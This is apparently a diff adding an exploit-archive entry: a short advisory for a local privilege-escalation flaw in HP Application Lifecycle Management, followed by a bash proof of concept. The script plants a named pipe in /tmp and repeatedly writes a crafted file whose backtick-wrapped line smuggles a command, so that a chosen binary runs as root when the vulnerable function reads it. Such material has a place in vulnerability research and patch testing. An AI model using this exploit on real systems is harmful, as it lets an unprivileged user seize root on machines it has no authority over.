@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/50982/info
+
+HP Application Lifestyle Management is prone to a local privilege-escalation vulnerability.
+
+Local attackers can exploit this issue to execute arbitrary code with elevated privileges. 
+
+#!/bin/bash
+# Simple PoC : Run as user, when vulnerable function is called
+# /home/user/binary_to_run_as_root is run as root.
+cat > file << EOF
+Child Components
+0a29406d9794e4f9b30b3c5d6702c708
+\`/home/user/binary_to_run_as_root\`
+EOF
+mkfifo /tmp/tmp.txt                     # set trap
+cat /tmp/tmp.txt                        # blocks for victim
+while [ -e /tmp/tmp.txt ]; do
+       cat file > /tmp/tmp.txt
+       sleep 2
+done
+rm file
